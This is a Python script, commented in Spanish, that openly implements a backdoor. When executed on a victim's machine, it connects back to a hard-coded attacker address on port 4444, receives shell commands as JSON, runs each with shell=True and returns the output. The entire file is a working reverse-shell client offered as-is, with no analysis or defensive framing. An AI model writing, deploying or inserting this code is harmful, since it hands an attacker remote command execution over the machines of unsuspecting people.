import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((bytes(ip, 'utf-8'), port)) #La víctima establece conexión con la computadora atacante

    #Codificación json:
    def reliableSend(self, data):
        jsonData = json.dumps(data.decode('utf-8'))
        self.connection.send(bytes(jsonData, 'utf-8'))

    #Decodificación json:
    def reliableRecieve(self):
        jsonData = ''
        while True:
            try:
                jsonData = self.connection.recv(1024)
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: continue
    
    def runCommand(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        try:
            while True: #Permite al programa ejecutarse indefinidamente
                command = self.reliableRecieve() #Recibe toda la información que le enviemos(En este caso, comandos de consola)
                commandResults = self.runCommand(command)
                self.reliableSend(commandResults)

        except KeyboardInterrupt:
            self.reliableSend(b'El cliente ha finalizado la conexion')
            self.connection.close()
            print('\nConexión finalizada')


backdoor = Backdoor('192.168.1.14', 4444)
backdoor.run()
